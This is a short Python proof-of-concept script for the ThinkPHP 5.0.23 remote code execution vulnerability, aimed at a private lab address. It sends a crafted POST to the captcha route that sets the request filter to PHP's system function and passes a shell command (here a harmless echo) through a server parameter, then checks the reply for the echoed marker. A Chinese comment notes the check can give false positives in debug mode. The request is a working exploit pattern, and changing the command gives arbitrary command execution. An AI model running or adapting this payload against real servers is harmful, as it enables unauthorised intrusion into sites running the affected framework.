import requests
requests.packages.urllib3.disable_warnings()
headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"
}

def run(url):
    """Thinkphp 5.0 remote code exec"""
    #这个poc写的有缺陷...因为在调式模式错误的时候会把feidao.version也会显示出来
    data = {
        "_method" : "__construct",
        "filter" : "system",
        "method": "get",
        "server[REQUEST_METHOD]" : "echo feidao.version"
    }
    url = url + "/index.php?s=captcha"
    req = requests.post(url, data=data, headers=headers, timeout=3)
    # print(req.text)
    if 'feidao.version' in req.text:
        return "Thinkphp 5.0.23 RCE Vulnerable"
    else:
        return False



if __name__ == '__main__':
    print(run("http://172.16.134.146/cms/TP5/public"))
